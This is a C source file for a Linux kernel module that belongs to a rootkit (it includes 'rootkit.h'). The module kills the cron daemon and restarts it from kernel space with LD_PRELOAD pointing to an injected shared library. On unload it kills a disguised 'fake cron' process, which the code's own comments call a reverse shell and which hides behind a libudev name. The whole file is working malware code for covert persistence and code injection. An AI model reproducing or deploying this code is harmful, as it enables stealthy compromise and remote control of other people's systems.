// Injects an .so into cron jobs
// TODO: Make it more generic, so it can inject into any process
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/sched/signal.h>
#include <linux/pid.h>
#include <linux/delay.h>
#include "rootkit.h"

#define SUCCESS 0

static bool injector_initialized = false;

static void wait_for_process_exit(pid_t pid, int timeout_ms)
{
    int waited = 0;
    while (waited < timeout_ms) {
        struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);
        if (!task)
            break; // Process is gone

        msleep(50);
        waited += 50;
    }
}

static int kill_cron_and_restart_with_preload(void)
{
    struct task_struct *task;
    int ret = SUCCESS;

    for_each_process(task)
    {
        if (task->mm)
        {
            if (!strcmp(task->comm, "cron") || !strcmp(task->comm, "crond"))
            {
                DBG_PRINT("[Injector] Found cron PID: %d\n", task->pid);

                ret = send_sig(SIGKILL, task, 0);
                if (ret != 0)
                    DBG_PRINT("[Injector] Failed to kill cron PID %d: %d\n", task->pid, ret);
                else
                    DBG_PRINT("[Injector] Killed cron PID %d\n", task->pid);

                wait_for_process_exit(task->pid, 2000); // Wait for up to 2 seconds

                char *argv[] = {CRON_PATH, NULL};
                char *envp[] = {
                    "LD_PRELOAD=" INJECT_SO_PATH,
                    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                    NULL
                };

                ret = call_usermodehelper(CRON_PATH, argv, envp, UMH_WAIT_PROC);
                if (ret != 0)
                {
                    DBG_PRINT("[Injector] Failed to restart cron with LD_PRELOAD: %d\n", ret);
                    char *argv[] = {CRON_PATH, NULL};
                    char *envp[] = {
                        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
                        NULL
                    };
                    call_usermodehelper(CRON_PATH, argv, envp, UMH_WAIT_PROC);
                    return ret;
                }
                else
                    DBG_PRINT("[Injector] Restarted cron with LD_PRELOAD\n");

                break;
            }
        }
    }
    return ret;
}

static void cleanup_cron_injection(void)
{
    struct task_struct *task;
    int ret = SUCCESS;

    for_each_process(task)
    {
        if (task->mm && !strcmp(task->comm, "cron"))
        {
            struct file *exe = task->mm->exe_file;
            char *buf, *path;

            if (!exe)
                continue;

            buf = kmalloc(PATH_MAX, GFP_KERNEL);
            if (!buf)
                continue;

            path = d_path(&exe->f_path, buf, PATH_MAX);
            if (IS_ERR(path)) {
                kfree(buf);
                continue;
            }

            DBG_PRINT("[Injector] Cron PID %d exe path: %s\n", task->pid, path);

            if (strstr(path, "libudev")) // fake so name
            { 
                DBG_PRINT("[Injector] Killing fake cron (reverse shell) PID: %d\n", task->pid);
                send_sig(SIGKILL, task, 0);
            } 
            else if (strstr(path, "cron"))
            {
                DBG_PRINT("[Injector] Killing real cron (injected) PID: %d\n", task->pid);
                send_sig(SIGKILL, task, 0);
                wait_for_process_exit(task->pid, 2000);

                char *argv[] = {CRON_PATH, NULL};
                char *envp[] = {
                    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", // no LD_PRELOAD
                    NULL
                };

                ret = call_usermodehelper(CRON_PATH, argv, envp, UMH_WAIT_PROC);
                if (ret == 0)
                    DBG_PRINT("[Injector] Restarted cron without injection.\n");
                else
                    DBG_PRINT("[Injector] Failed to restart cron cleanly: %d\n", ret);
            }

            kfree(buf);
        }
    }
}

int injector_init(void)
{
    int ret = SUCCESS;
    if (!injector_initialized)
    {
        DBG_PRINT("[Injector] Loaded: replacing cron...\n");
        ret = kill_cron_and_restart_with_preload();
        injector_initialized = true;
    }
    else
    {
        DBG_PRINT("[Injector] Already initialized\n");
        ret = -1; // Already initialized
    }
    return ret;
}

void injector_cleanup(void)
{
    if (injector_initialized)
    {
        cleanup_cron_injection();
        DBG_PRINT("[Injector] Unloaded\n");
        injector_initialized = false;
    }
}
